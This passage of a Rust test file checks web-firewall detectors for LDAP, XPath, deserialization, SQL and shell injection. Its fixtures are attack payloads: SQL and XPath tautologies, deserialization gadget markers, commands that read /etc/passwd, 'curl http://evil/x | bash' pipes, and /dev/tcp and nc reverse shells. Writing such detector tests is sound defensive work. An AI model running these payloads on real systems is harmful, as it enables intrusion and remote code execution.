            assert!(ldap_fire_all(payload).is_some(), "fires under full set: {payload}");
            let f = ldap_fire_all(payload).unwrap_or_else(|| panic!("fires under full set: {payload}"));
            assert_eq!(f.rule_key, expect, "payload: {payload}");
        }
    }

    #[test]
    fn ldap_clean_traffic_does_not_fire() {
        // Legitimate content that merely contains LDAP filter metacharacters must
        // not trip the default-on structural rules.
        for clean in [
            // Math / boolean expressions with parens and operators.
            r"result = (a|b)&c",
            r"total = (price * qty) + tax",
            r"if (x > 0) && (y < 10) { run(); }",
            // Ordinary URL query strings.
            r"https://example.com/search?name=john&age=30&sort=asc",
            r"/api/items?filter=active&limit=100",
            // Curried / nested call syntax with adjacency.
            r"const add = (a)(b) => a + b;",
            r"foo(bar)(baz)",
            // Prose and glob patterns with wildcards.
            r"select all files matching *.txt in the folder",
            r"5 * 3 = 15 and 2 * 4 = 8",
            // A legit LDAP-ish attribute mention without a filter break.
            r"the uid attribute maps to the user id column",
            // JSON payload with ampersands / stars in values.
            r#"{"query":"cats & dogs","wildcard":"a*b"}"#,
        ] {
            assert!(ldap_fire(clean).is_none(), "clean LDAP negative fired: {clean:?}");
        }
    }

    #[test]
    fn ldap_pathological_input_declines_without_stack_overflow() {
        // Pure-regex detector over a backtracking-free automaton: a huge run of
        // metacharacters is a bounded linear scan that returns promptly and never
        // overflows the stack or blows up on backtracking (ReDoS). The default-on
        // rules require the structural co-occurrence, so a contentless nest of bare
        // metacharacters is a clean decline.
        let stars = "*".repeat(200_000);
        assert!(ldap_fire(&stars).is_none(), "bare wildcard run declines default-on");
        let parens = "()".repeat(100_000);
        assert!(ldap_fire(&parens).is_none(), "bare paren run declines default-on");
        let adjacency = ")(".repeat(100_000);
        // `)(` adjacency alone is default-off (no attribute / operator), so even this
        // pathological repeat must not fire a default-on rule and must return fast.
        assert!(
            ldap_fire(&adjacency).is_none(),
            "bare )( adjacency run declines default-on"
        );
    }

    // ── XPath injection structural detector (T2-E) ───────────────────────────

    fn xpath_fire(text: &str) -> Option<DetectionFinding> {
        run(&XpathStructuralDetector::new(), text)
    }

    fn xpath_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&XpathStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn xpath_all_rules_compile() {
        let det = XpathStructuralDetector::with_all_rules();
        assert_eq!(det.rules.len(), XPATH_RULES.len(), "every XPath pattern must compile");
    }

    #[test]
    fn xpath_id_and_config_string() {
        assert_eq!(XpathStructuralDetector::new().id(), DetectorId::XpathStruct);
        assert_eq!(DetectorId::XpathStruct.as_config_str(), "xpath_struct");
        assert_eq!(
            DetectorId::from_config_str("xpath_struct"),
            Some(DetectorId::XpathStruct)
        );
        assert_eq!(AttackKind::XpathInjection.as_config_key(), "xpath_injection");
        assert_eq!(
            AttackKind::from_config_key("xpath_injection"),
            Some(AttackKind::XpathInjection)
        );
    }

    #[test]
    fn xpath_default_on_excludes_high_noise_rules() {
        let det = XpathStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in [
            "xpath.bare_double_slash",
            "xpath.bare_logical",
            "xpath.bare_predicate",
            "xpath.bare_func",
        ] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "xpath.node_axis_union",
            "xpath.auth_bypass_func",
            "xpath.quote_tautology",
            "xpath.func_axis",
            "xpath.predicate_close_logic",
            "xpath.axis_predicate_func",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn xpath_structural_signatures_fire_default_on() {
        // Each payload is chosen to trip exactly one default-on rule so the winning
        // rule_key is deterministic.
        for (payload, expect) in [
            (r"abc']|//user/password", "xpath.node_axis_union"),
            (r"' or position()=1", "xpath.auth_bypass_func"),
            (r"' or '1'='1", "xpath.quote_tautology"),
            (r"string-length(//user/pass)>10", "xpath.func_axis"),
            (r"admin'] and 1=1", "xpath.predicate_close_logic"),
            (r"//*[contains(text(),'x')]", "xpath.axis_predicate_func"),
        ] {
            let f = xpath_fire(payload).unwrap_or_else(|| panic!("must fire: {payload}"));
            assert_eq!(f.attack, AttackKind::XpathInjection);
            assert_eq!(f.rule_key, expect, "payload: {payload}");
        }
    }

    #[test]
    fn xpath_double_quote_tautology_and_union_variants_fire() {
        // Double-quote tautology and the quote-prefixed union break.
        assert_eq!(
            xpath_fire(r#"" or "1"="1"#)
                .expect("double-quote tautology fires")
                .rule_key,
            "xpath.quote_tautology"
        );
        assert_eq!(
            xpath_fire(r"x')] | //node").expect("quoted union break fires").rule_key,
            "xpath.node_axis_union"
        );
        // `substring(name(` — function pulling from a nested node function.
        assert_eq!(
            xpath_fire(r"substring(name(//user[1]),1,1)")
                .expect("func over name() fires")
                .rule_key,
            "xpath.func_axis"
        );
    }

    #[test]
    fn xpath_bare_tokens_are_default_off() {
        // The ubiquitous bare XPath tokens must NOT fire under the default rule set
        // (the whole FP-control thesis of T2-E); they only fire under the full set.
        for (payload, expect) in [
            (r"see http://example.com//docs", "xpath.bare_double_slash"),
            (r"cats and dogs or birds", "xpath.bare_logical"),
            (r"items[0] = value", "xpath.bare_predicate"),
            (r"total = count(rows)", "xpath.bare_func"),
        ] {
            assert!(
                xpath_fire(payload).is_none(),
                "bare-token payload must be default-off: {payload}"
            );
            let f = xpath_fire_all(payload).unwrap_or_else(|| panic!("fires under full set: {payload}"));
            assert_eq!(f.rule_key, expect, "payload: {payload}");
        }
    }

    #[test]
    fn xpath_clean_traffic_does_not_fire() {
        // Legitimate content that merely contains XPath tokens (`//`, `or`/`and`,
        // `[]`, function calls) must not trip the default-on structural rules.
        for clean in [
            // Ordinary URLs with `//` and query operators.
            r"https://example.com/search?name=john&sort=asc",
            r"visit http://a//b for the mirror",
            r"/api/items?active=true&limit=100",
            // Math / boolean prose with `or` / `and`.
            r"choose red or blue and keep the receipt",
            r"if (x > 0 and y < 10) then run",
            r"5 or 6 apples, either is fine",
            // Array / index access and legit function calls.
            r"const n = items[0] + rows[1];",
            r"total = count(rows) + substring(name, 0, 3)",
            r"array[index] = value[key]",
            // A legit mention of xpath-ish words without a break.
            r"the position and name fields map to columns",
            // JSON with brackets, slashes and operators in values.
            r#"{"path":"a/b//c","q":"cats and dogs","list":[1,2,3]}"#,
        ] {
            assert!(xpath_fire(clean).is_none(), "clean XPath negative fired: {clean:?}");
        }
    }

    #[test]
    fn xpath_quote_tautology_narrowed_to_single_char_operands() {
        // F-C: the quote-tautology rule now requires single-char operands (`'1'='1`),
        // so the legitimate faceted-search DSL `author='smith' and 'year'='2020'`
        // (multi-char distinct field/value operands) no longer fires, while the
        // canonical `'1'='1` / `'a'='a` / `" or "1"="1` tautology still does.
        for benign in [
            r"author='smith' and 'year'='2020'",
            r"title='foo' or 'category'='books'",
            r"name='alice' and 'city'='paris'",
        ] {
            assert!(
                xpath_fire(benign).is_none(),
                "legitimate quoted faceted search must not fire: {benign}"
            );
        }
        for attack in [r"' or '1'='1", r"' or 'a'='a", r#"" or "1"="1"#] {
            assert_eq!(
                xpath_fire(attack)
                    .unwrap_or_else(|| panic!("real tautology must fire: {attack}"))
                    .rule_key,
                "xpath.quote_tautology",
                "payload: {attack}"
            );
        }
    }

    #[test]
    fn xpath_auth_bypass_func_requires_axis_for_count() {
        // F-D: `count`/`string-length` (ordinary English/SQL words) now require an
        // absolute-axis argument (`or count(//`), so bare-prose `or count(items)` /
        // `or count(*)` no longer fires; the XPath-distinctive node functions
        // (`position`/`last`/`name`/`local-name`) still fire on their own, and the real
        // blind-extraction `or count(//user)` fires.
        for benign in [
            r"search by name or count(items)",
            r"sum or count(*) whichever is larger",
            r"group and count(rows) per bucket",
        ] {
            assert!(
                xpath_fire(benign).is_none(),
                "bare or/and count( in prose must not fire: {benign}"
            );
        }
        for attack in [
            r"' or count(//user)>0",
            r"x' or count(/root/user)>1",
            r"' or position()=1",
            r"admin' and last()",
        ] {
            assert_eq!(
                xpath_fire(attack)
                    .unwrap_or_else(|| panic!("XPath auth-bypass must fire: {attack}"))
                    .rule_key,
                "xpath.auth_bypass_func",
                "payload: {attack}"
            );
        }
    }

    #[test]
    fn xpath_pathological_input_declines_without_stack_overflow() {
        // Pure-regex detector over a backtracking-free automaton: a huge run of
        // bare XPath tokens is a bounded linear scan that returns promptly and never
        // overflows the stack or blows up on backtracking (ReDoS). The default-on
        // rules require the structural co-occurrence, so a contentless token run is a
        // clean decline.
        let slashes = "//".repeat(200_000);
        assert!(xpath_fire(&slashes).is_none(), "bare // run declines default-on");
        let logic = "' or ".repeat(100_000);
        assert!(xpath_fire(&logic).is_none(), "repeated ' or run declines default-on");
        let brackets = "][".repeat(100_000);
        assert!(xpath_fire(&brackets).is_none(), "bare bracket run declines default-on");
    }

    // ── Unsafe-deserialization structural detector (T2-F) ────────────────────

    fn deser_fire(text: &str) -> Option<DetectionFinding> {
        run(&DeserStructuralDetector::new(), text)
    }

    fn deser_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&DeserStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn deser_all_rules_compile() {
        let det = DeserStructuralDetector::with_all_rules();
        assert_eq!(det.rules.len(), DESER_RULES.len(), "every deser pattern must compile");
    }

    #[test]
    fn deser_id_and_config_string() {
        assert_eq!(DeserStructuralDetector::new().id(), DetectorId::DeserStruct);
        assert_eq!(DetectorId::DeserStruct.as_config_str(), "deser_struct");
        assert_eq!(
            DetectorId::from_config_str("deser_struct"),
            Some(DetectorId::DeserStruct)
        );
        assert_eq!(AttackKind::Deserialization.as_config_key(), "deserialization");
        assert_eq!(
            AttackKind::from_config_key("deserialization"),
            Some(AttackKind::Deserialization)
        );
    }

    #[test]
    fn deser_default_on_excludes_high_noise_rules() {
        let det = DeserStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in [
            "deser.php_array",
            "deser.py_reduce",
            "deser.java_pkg_generic",
            // F-E / F-F: the class-agnostic PHP object header and the bare .NET
            // formatter type names are demoted to default-off (FP-prone).
            "deser.php_object_injection",
            "deser.dotnet_formatter_name",
        ] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "deser.java_serial_b64",
            "deser.java_hex_magic",
            "deser.java_gadget_class",
            // F-E: the gadget-class-narrowed PHP object rule replaces the generic one.
            "deser.php_object_gadget",
            "deser.php_phar",
            "deser.py_pickle_global_exec",
            "deser.dotnet_binaryformatter_b64",
            "deser.dotnet_gadget",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn deser_structural_signatures_fire_default_on() {
        // Each payload is chosen to trip exactly one default-on rule so the winning
        // rule_key is deterministic. Serialized payloads / gadget class names are WAF
        // detection fixtures — inert data matched by regex, never deserialized.
        for (payload, expect) in [
            // Java stream base64 prefix (rO0AB…) — hits the raw view, no decode.
            ("rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0", "deser.java_serial_b64"),
            // Java stream magic in hex-text form.
            ("payload=aced0005737200", "deser.java_hex_magic"),
            // ysoserial gadget leaf class.
            (
                "org.apache.commons.collections.functors.InvokerTransformer",
                "deser.java_gadget_class",
            ),
            // PHP serialize() typed-object header carrying a known PHPGGC gadget class.
            (
                r#"O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:4:"data";s:2:"id";}"#,
                "deser.php_object_gadget",
            ),
            // PHP phar wrapper.
            ("file=phar://evil.phar/x", "deser.php_phar"),
            // Python pickle GLOBAL opcode reducing os.system (newlines collapse to
            // spaces at the view surface).
            ("cos\nsystem\n(S'id'\ntR.", "deser.py_pickle_global_exec"),
            // .NET BinaryFormatter serialized base64 header.
            ("AAEAAAD/////AAAAAA", "deser.dotnet_binaryformatter_b64"),
            // .NET ysoserial.net gadget marker.
            ("<ExpandedWrapperOfXamlReaderObjectDataProvider>", "deser.dotnet_gadget"),
        ] {
            let f = deser_fire(payload).unwrap_or_else(|| panic!("must fire: {payload}"));
            assert_eq!(f.attack, AttackKind::Deserialization);
            assert_eq!(f.rule_key, expect, "payload: {payload}");
        }
    }

    #[test]
    fn deser_pickle_builtin_and_subprocess_variants_fire() {
        // __builtin__ eval and subprocess reductions, plus posix.system.
        for payload in [
            "c__builtin__\neval\n(...",
            "csubprocess\ncheck_output\n(",
            "cposix\nsystem\n(",
        ] {
            assert_eq!(
                deser_fire(payload)
                    .unwrap_or_else(|| panic!("pickle combo fires: {payload}"))
                    .rule_key,
                "deser.py_pickle_global_exec",
                "payload: {payload}"
            );
        }
    }

    #[test]
    fn deser_decoded_view_catches_wrapped_pickle() {
        // A base64-wrapped pickle surfaces its GLOBAL opcode only on the decoded view
        // the preprocessor produces; the detector consumes that view text just like any
        // other. Here we feed the already-decoded surface (BlindDecoded provenance in
        // production) to prove the rule matches the decoded form.
        let decoded = "cos\nsystem\n(S'whoami'\ntR.";
        assert_eq!(
            deser_fire(decoded).expect("decoded pickle fires").rule_key,
            "deser.py_pickle_global_exec"
        );
    }

    #[test]
    fn deser_high_noise_tokens_are_default_off() {
        // Generic serialization markers must NOT fire under the default rule set (the
        // FP-control thesis of T2-F); they only fire under the full set.
        for (payload, expect) in [
            (r#"a:3:{i:0;s:1:"x";i:1;i:2;i:2;b:1;}"#, "deser.php_array"),
            ("class Foo:\n    def __reduce__(self):", "deser.py_reduce"),
            (
                "dependency: org.apache.commons.collections:3.2.1",
                "deser.java_pkg_generic",
            ),
            // F-E: a legit `stdClass` object serialization (WP/Laravel cookie/cache)
            // matches only the class-agnostic, now default-off generic rule.
            (
                r#"O:8:"stdClass":1:{s:4:"name";s:3:"joe";}"#,
                "deser.php_object_injection",
            ),
            // F-F: the bare .NET formatter type name in prose / code review is
            // default-off; only the true ysoserial.net gadget markers fire default-on.
            (
                "we should stop using BinaryFormatter for untrusted input",
                "deser.dotnet_formatter_name",
            ),
        ] {
            assert!(
                deser_fire(payload).is_none(),
                "high-noise payload must be default-off: {payload}"
            );
            let f = deser_fire_all(payload).unwrap_or_else(|| panic!("fires under full set: {payload}"));
            assert_eq!(f.rule_key, expect, "payload: {payload}");
        }
    }

    #[test]
    fn deser_php_gadget_fires_but_benign_stdclass_does_not() {
        // F-E: the gadget-class-narrowed PHP object rule catches a real PHPGGC chain
        // (Monolog/Guzzle/Symfony/… class root) default-on, while an ordinary
        // `O:8:"stdClass"` typed object — normal PHP session/cookie serialization —
        // does NOT fire under the default set.
        assert_eq!(
            deser_fire(r#"O:39:"GuzzleHttp\Psr7\FnStream":2:{s:7:"methods";}"#)
                .expect("guzzle gadget object fires")
                .rule_key,
            "deser.php_object_gadget",
        );
        for benign in [
            r#"O:8:"stdClass":1:{s:4:"name";s:3:"joe";}"#,
            r#"O:4:"User":2:{s:2:"id";i:7;s:4:"name";s:3:"amy";}"#,
        ] {
            assert!(
                deser_fire(benign).is_none(),
                "benign PHP object serialization must not fire default-on: {benign}"
            );
        }
    }

    #[test]
    fn deser_dotnet_gadget_fires_but_bare_formatter_name_does_not() {
        // F-F: a real ysoserial.net gadget marker fires default-on; the bare formatter
        // TYPE names (which recur in benign .NET code / docs / discussion) do not.
        for gadget in [
            "<ExpandedWrapperOfXamlReaderObjectDataProvider>",
            "TypeConfuseDelegate",
            "ActivitySurrogateSelector",
        ] {
            assert_eq!(
                deser_fire(gadget)
                    .unwrap_or_else(|| panic!(".NET gadget must fire: {gadget}"))
                    .rule_key,
                "deser.dotnet_gadget",
                "payload: {gadget}"
            );
        }
        for benign in [
            "we should stop using BinaryFormatter for untrusted input",
            "LosFormatter was deprecated in favour of a safer serializer",
        ] {
            assert!(
                deser_fire(benign).is_none(),
                "bare .NET formatter type name must not fire default-on: {benign}"
            );
        }
    }

    #[test]
    fn deser_pickle_word_internal_cos_does_not_fire() {
        // F-A: the pickle GLOBAL-exec rule carries a leading `\b`, so the extremely
        // common benign phrase `macOS system` (word-internal `cos`) no longer trips it,
        // while a real `cos\nsystem` GLOBAL opcode still does.
        for benign in [
            "macos system update available",
            "the acos system returns a radian value",
            "please restart the macos system service",
        ] {
            assert!(
                deser_fire(benign).is_none(),
                "word-internal cos must not fire pickle rule: {benign}"
            );
        }
        assert_eq!(
            deser_fire("cos\nsystem\n(S'id'\ntR.")
                .expect("real pickle GLOBAL opcode fires")
                .rule_key,
            "deser.py_pickle_global_exec",
        );
    }

    #[test]
    fn deser_clean_traffic_does_not_fire() {
        // Legitimate content that merely resembles serialization tokens (ordinary
        // base64, JSON, PHP arrays, java package names in prose/logs) must not trip the
        // default-on rules.
        for clean in [
            // Ordinary base64 blobs (avatars, tokens) without the java/.NET magic.
            "data=SGVsbG8gV29ybGQgdGhpcyBpcyBqdXN0IHRleHQ",
            "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
            // Plain JSON with brackets, braces and colons.
            r#"{"user":"john","roles":["admin","editor"],"active":true}"#,
            // A benign dependency / class-path mention (generic package, default-off).
            "loaded org.apache.commons.lang3 and org.apache.commons.io",
            "stacktrace at com.example.service.UserController.handle",
            // Prose that happens to contain the words system / eval / object.
            "the system will eval the object and return a data provider",
            "please reduce the object count in the data set",
            // A URL with slashes and query operators.
            "https://cdn.example.com/assets/app.v2.min.js?cache=1",
            // A legit PHP array serialize (structurally an array, default-off).
            r#"a:2:{s:4:"name";s:4:"john";s:3:"age";i:30;}"#,
        ] {
            assert!(deser_fire(clean).is_none(), "clean deser negative fired: {clean:?}");
        }
    }

    #[test]
    fn deser_pathological_input_declines_without_stack_overflow() {
        // Pure-regex detector over a backtracking-free automaton: a huge run of
        // serialization-ish tokens is a bounded linear scan that returns promptly and
        // never overflows the stack or blows up on backtracking (ReDoS). The default-on
        // rules require the magic/gadget/opcode signature, so a contentless token run is
        // a clean decline.
        let arrays = "a:9:{".repeat(200_000);
        assert!(deser_fire(&arrays).is_none(), "bare php-array run declines default-on");
        let b64 = "aGVsbG8".repeat(200_000);
        assert!(deser_fire(&b64).is_none(), "bare base64 run declines default-on");
        let objs = "o:1:".repeat(200_000);
        assert!(
            deser_fire(&objs).is_none(),
            "truncated php-object run declines default-on"
        );
        let colons = "c:o:s:".repeat(200_000);
        assert!(deser_fire(&colons).is_none(), "colon run declines default-on");
    }

    // ── AST SQLi detector (P2) ────────────────────────────────────────────────

    fn ast_fire(text: &str) -> Option<DetectionFinding> {
        run(&AstSqlDetector::new(), text)
    }

    #[test]
    fn ast_union_fires_statement_level() {
        // Pitfall ②: a UNION is invisible at the expression level; the statement
        // wrapper surfaces it as a set operation.
        let f = ast_fire("1 union select null,null,null from users").expect("union must fire");
        assert_eq!(f.rule_key, "ast.union");
        assert_eq!(f.attack, AttackKind::SqlInjection);
        assert_eq!(f.confidence, 85);
        assert!(
            ast_fire("1 union all select 1,2").is_some(),
            "union all is still a set op"
        );
    }

    #[test]
    fn ast_stacked_fires_statement_level() {
        // Pitfall ②: a stacked statement is only visible once parsed at the
        // statement level (`stmts.len() > 1`).
        let f = ast_fire("1;drop table x").expect("stacked must fire");
        assert_eq!(f.rule_key, "ast.stacked");
        assert_eq!(f.confidence, 90);
        assert_eq!(
            ast_fire("1;update users set admin=1")
                .expect("stacked update must fire")
                .rule_key,
            "ast.stacked"
        );
    }

    #[test]
    fn ast_tautology_quote_breakout_fires_with_eof_consumed() {
        // Pitfall ①: `1' or '1'='1` — a numeric wrapper leaves a dangling quote
        // (parse error, no false "clean"); the single-quote breakout wrapper parses
        // it fully (consume-to-EOF via `parse_statements`) and reveals the OR +
        // constant-comparison tautology.
        let f = ast_fire("1' or '1'='1").expect("quote-breakout tautology must fire");
        assert_eq!(f.rule_key, "ast.tautology");
        assert_eq!(f.confidence, 80);
        // Numeric tautology too.
        assert_eq!(
            ast_fire("1 or 1=1").expect("numeric tautology").rule_key,
            "ast.tautology"
        );
    }

    #[test]
    fn ast_comment_obfuscated_injection_is_labelled() {
        // Pitfall ③: comments vanish in the AST — the tokenizer strips `/**/`, so
        // `1/**/or/**/1=1` still parses to the OR tautology, and because the source
        // carried a comment marker it is labelled `ast.comment_obfusc` at the char
        // layer.
        let f = ast_fire("1/**/or/**/1=1").expect("comment-obfuscated tautology must fire");
        assert_eq!(f.rule_key, "ast.comment_obfusc");
    }

    #[test]
    fn ast_dangerous_fn_fires() {
        let f = ast_fire("1 and sleep(5)").expect("time-based blind must fire");
        assert_eq!(f.rule_key, "ast.dangerous_fn");
        assert_eq!(f.confidence, 85);
        assert_eq!(
            ast_fire("1 and extractvalue(1,concat(0x7e,version()))")
                .expect("extractvalue must fire")
                .rule_key,
            "ast.dangerous_fn"
        );
    }

    #[test]
    fn ast_subquery_fires() {
        let f = ast_fire("1 = (select password from users limit 1)").expect("subquery must fire");
        assert_eq!(f.rule_key, "ast.subquery");
        assert_eq!(f.confidence, 78);
    }

    #[test]
    fn ast_clean_traffic_does_not_fire() {
        // The high-FP surface: benign scalars, prose with `or`/`and`, JSON, UUIDs,
        // versions, identifiers, and "looks-like-a-column" values must NOT fire.
        for clean in [
            "42",
            "alice",
            "laptop",
            "price",
            "true",
            "null",
            "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
            "version=1.2.3",
            "the quick brown fox jumps over the lazy dog",
            "cats and dogs and birds",
            "active or inactive",
            "true or false",
            "red and blue",
            "please select an option from the menu",
            "reunion committee",
            "q=laptop&sort=price&order=asc&page=2",
            r#"{"name":"alice","role":"admin","age":30}"#,
            "SELECT_ALL=1&reunion=family",
            "i love my cat and my dog",
            "search for shoes and socks",
            "status = active",
            "order by relevance please",
            "drops of rain and sunshine",
            "a normal sentence, nothing to see here",
            "user@example.com",
            "2026-07-23T00:00:00Z",
        ] {
            assert!(
                ast_fire(clean).is_none(),
                "clean AST negative fired: {clean:?} -> {:?}",
                ast_fire(clean)
            );
        }
    }

    #[test]
    fn ast_prefilter_skips_non_sql() {
        // The prefilter (cheap gate) must reject benign scalars so no AST budget is
        // spent, and admit the injection shapes.
        assert!(!ast_prefilter("42"));
        assert!(!ast_prefilter("alice"));
        assert!(!ast_prefilter("cats and dogs")); // `and` without a comparison
        assert!(!ast_prefilter("active or inactive"));
        assert!(ast_prefilter("1 or 1=1")); // `or` + comparison
        assert!(ast_prefilter("1 union select 1"));
        assert!(ast_prefilter("1;drop table x"));
        assert!(ast_prefilter("1' or '1'='1"));
        assert!(ast_prefilter("1/**/or/**/1=1"));
    }

    #[test]
    fn ast_deep_nesting_is_declined_without_stack_overflow() {
        // Stack-safety guard (recursive-protection OFF): pathological nesting is
        // rejected by the depth pre-scan BEFORE the parser runs, so it can never
        // overflow the stack. Each of these would abort the process if parsed.
        let parens = format!("{}1{}", "(".repeat(5000), ")".repeat(5000));
        let nots = format!("1 or {}1", "not ".repeat(5000));
        let cases = format!("{}1{}", "case when 1 then ".repeat(5000), " end".repeat(5000));
        // The P2 gap: space-separated unary `-`/`+` chains. `sqlparser` parses each
        // sign with a recursive `parse_prefix`, so a `1 or 1 < - - … 1` chain of a
        // few hundred signs overflows the worker stack — but the old depth scan
        // counted `(`/`~`/`!`/not/case only and estimated depth 0 for this input,
        // admitting it to the parser. 600 signs is well past the measured overflow
        // floor (release ~376, debug ~60), so on the pre-fix code this input aborts
        // the process (EXIT 134); the fix must decline it here instead.
        let unary_minus = format!("1 or 1 < {}1", "- ".repeat(600));
        let unary_plus = format!("1 or 1 < {}1", "+ ".repeat(600));
        let tildes = format!("1 or 1 < {}1", "~".repeat(600));
        let bangs = format!("1 or 1 < {}1", "!".repeat(600));
        // Mixed drivers must also be declined (their counts sum in the estimate).
        let mixed = format!("1 or {}1", "not - ~ case when 1 then ".repeat(200));
        for deep in [
            &parens,
            &nots,
            &cases,
            &unary_minus,
            &unary_plus,
            &tildes,
            &bangs,
            &mixed,
        ] {
            assert!(
                !ast_structural_depth_ok(deep),
                "deep input must be declined: depth guard"
            );
            // And end-to-end: detect returns None (no signal, no parse, no panic).
            assert!(
                ast_fire(deep).is_none(),
                "deep input must not fire (declined pre-parse)"
            );
        }
        // A realistically-nested but shallow subquery is still admitted + detected.
        assert!(ast_structural_depth_ok("1 = (select 1)"));
    }

    #[test]
    fn ast_depth_guard_counts_every_recursion_driver() {
        // Isolate the driver *scan* from the byte-length backstop: every input here
        // is short (well under AST_MAX_INPUT_BYTES), so a decline can only come from
        // the per-driver count. A run of 13 of any single recursion driver exceeds
        // MAX_AST_NESTING (12) and must be declined. Pre-fix, the unary `+`/`-` rows
        // asserted `false` but the scan returned `true` (they were uncounted) — this
        // test fails on the old code without aborting.
        let n = 13;
        let cases = [
            ("paren", format!("1 < {}1{}", "(".repeat(n), ")".repeat(n))),
            ("tilde", format!("1 < {}1", "~".repeat(n))),
            ("bang", format!("1 < {}1", "!".repeat(n))),
            ("minus", format!("1 < {}1", "- ".repeat(n))),
            ("plus", format!("1 < {}1", "+ ".repeat(n))),
            ("not", format!("1 or {}1", "not ".repeat(n))),
            ("interval", format!("1 < {}1", "interval ".repeat(n))),
        ];
        for (kind, s) in &cases {
            assert!(
                s.len() <= AST_MAX_INPUT_BYTES,
                "{kind} probe must exercise the scan, not the byte cap"
            );
            assert!(
                !ast_structural_depth_ok(s),
                "{kind} chain (>{MAX_AST_NESTING}) must be declined by the driver scan"
            );
        }
        // A short run of the same drivers (<= cap) is still admitted.
        assert!(ast_structural_depth_ok("1 < - - - 1"));
        assert!(ast_structural_depth_ok("1 or not not 1=1"));
    }

    #[test]
    fn ast_over_length_input_declined_by_byte_backstop() {
        // The byte backstop declines any input longer than AST_MAX_INPUT_BYTES even
        // when its per-driver depth is trivial, so a missed future driver cannot
        // overflow through a long input. `1 or 1=1 ` + padding parses trivially but
        // is over the cap.
        let long = format!("1 or 1=1 {}", "a".repeat(AST_MAX_INPUT_BYTES));
        assert!(long.len() > AST_MAX_INPUT_BYTES);
        assert!(!ast_structural_depth_ok(&long), "over-length input must be declined");
        assert!(ast_fire(&long).is_none(), "over-length input must not fire");
        // Exactly at the cap with trivial depth is still admitted.
        let at_cap = format!("1 or 1=1{}", " ".repeat(AST_MAX_INPUT_BYTES - "1 or 1=1".len()));
        assert_eq!(at_cap.len(), AST_MAX_INPUT_BYTES);
        assert!(ast_structural_depth_ok(&at_cap));
    }

    #[test]
    fn ast_parse_error_is_fail_safe_not_a_hit() {
        // Garbage / broken SQL that does not parse to an injection structure must
        // not be reported as an attack (a parse failure is not, by itself,
        // evidence) — and must never panic.
        for weird in [
            "select from where",
            "union union union",
            "' or or or",
            "'''",
            "; ; ;",
            "/*/*/*",
            "select select select",
        ] {
            assert!(
                ast_fire(weird).is_none(),
                "malformed SQL must not be reported as an AST injection: {weird:?}"
            );
        }
    }

    #[test]
    fn ast_budget_exhaustion_stops_parsing() {
        // Once the AST-attempt budget is spent, further parses are skipped (degraded)
        // — the detector must not exceed `max_ast_attempts_per_request`.
        use crate::checks::content_security::budget::Budget;
        let det = AstSqlDetector::new();
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::new(Budget {
            max_ast_attempts_per_request: 1,
            ..Budget::default()
        });
        // First injection spends the single numeric attempt and hits — budget now 0,
        // not yet degraded (the attempt was within budget).
        assert!(det.detect(&view("1 union select 1"), &pctx, &mut st).is_some());
        assert!(!st.is_degraded());
        // The next injection cannot take an attempt → no parse, no signal, degraded.
        assert!(det.detect(&view("1;drop table y"), &pctx, &mut st).is_none());
        assert!(st.is_degraded());
    }

    // ── RCE true shell-AST detector (T1-A, brush-parser) ─────────────────────

    fn rce_ast_fire(text: &str) -> Option<DetectionFinding> {
        run(&RceAstDetector::new(), text)
    }

    fn rce_ast_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&RceAstDetector::with_all_rules(), text)
    }

    #[test]
    fn rce_ast_id_and_config_string() {
        assert_eq!(RceAstDetector::new().id(), DetectorId::RceAst);
        assert_eq!(DetectorId::RceAst.as_config_str(), "rce_ast");
        assert_eq!(DetectorId::from_config_str("rce_ast"), Some(DetectorId::RceAst));
    }

    #[test]
    fn rce_ast_interp_exec_flag_fires() {
        // Interpreter with an inline-code flag as a real command head.
        for payload in [
            "bash -c 'id'",
            "sh -c \"cat /etc/passwd\"",
            "python3 -c 'import os'",
            "perl -e 'system(1)'",
        ] {
            let f = rce_ast_fire(payload).unwrap_or_else(|| panic!("interp exec flag must fire: {payload:?}"));
            assert_eq!(f.attack, AttackKind::Rce);
            assert_eq!(f.rule_key, "rce_ast.interp_exec_flag", "payload {payload:?}");
        }
    }

    #[test]
    fn rce_ast_heredoc_to_interpreter_fires() {
        // The genuine Lane-1/P1c gap: a here-document / here-string feeding an
        // interpreter — invisible to every structural regex.
        let hd = rce_ast_fire("bash <<EOF\nid\ncat /etc/passwd\nEOF\n").expect("here-doc → interpreter must fire");
        assert_eq!(hd.rule_key, "rce_ast.heredoc_interp");
        let hs = rce_ast_fire("bash <<< \"id\"").expect("here-string → interpreter must fire");
        assert_eq!(hs.rule_key, "rce_ast.heredoc_interp");
    }

    #[test]
    fn rce_ast_pipe_to_interpreter_fires() {
        for payload in [
            "curl http://evil/x | bash",
            "wget -qO- http://evil | sh",
            "echo aWQK | base64 -d | bash",
        ] {
            let f = rce_ast_fire(payload).unwrap_or_else(|| panic!("pipe→interp must fire: {payload:?}"));
            assert_eq!(f.rule_key, "rce_ast.pipe_to_interp", "payload {payload:?}");
        }
    }

    #[test]
    fn rce_ast_reverse_shell_fires() {
        // /dev/tcp redirect and `nc -e` — complete reverse-shell structures.
        assert_eq!(
            rce_ast_fire("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
                .expect("/dev/tcp reverse shell must fire")
                .rule_key,
            "rce_ast.reverse_shell"
        );
        assert_eq!(
            rce_ast_fire("nc -e /bin/sh 10.0.0.1 4444")
                .expect("nc -e reverse shell must fire")
                .rule_key,
